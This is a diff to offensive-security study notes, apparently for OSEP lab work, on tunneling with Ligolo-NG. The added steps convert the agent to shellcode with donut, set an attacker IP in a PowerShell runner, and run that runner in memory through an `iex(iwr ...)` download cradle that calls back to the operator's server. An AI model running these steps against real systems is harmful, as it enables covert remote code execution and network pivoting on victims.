@@ -20,16 +20,24 @@
 
 # Tunneling - Ligolo-NG
 
-Make sure to convert agent.exe of ligolo to shellcode: 
+We will use the powershell shellcode runner [here](https://raw.githubusercontent.com/Extravenger/OSEPlayground/refs/heads/main/04%20-%20Tunneling/ligolo.ps1).
+
+1. Make sure to convert agent.exe of ligolo to shellcode: 
 - `donut -f 1 -o agent.bin -a 2 -p "-connect your-server:11601 -ignore-cert" -i agent.exe` 
 
-Make sure you are running as x64 bit process before running: 
+2. Make sure you are running as x64 bit process before running: 
 - Powershell - `[Environment]::Is64BitProcess`
 - CMD - `set p` (Should show PROCESSOR_ARCHITECTURE=AMD64)
 
 If you are in 32bit process, run: `%windir%\sysnative\WindowsPowerShell\v1.0\powershell.exe` - then check again.
 
+3. Make sure to change line number 14 to point to your IP Address:
+
+- `$url = "http://192.168.45.168/agent.bin" # CHANGE ME`
+
 Invoke it: `iex(iwr http://192.168.45.173:443/ligolo.ps1 -UseBasicParsing)`
+
+Finally you should see an agent connected to your ligolo server.
 
 
 # Map The Network
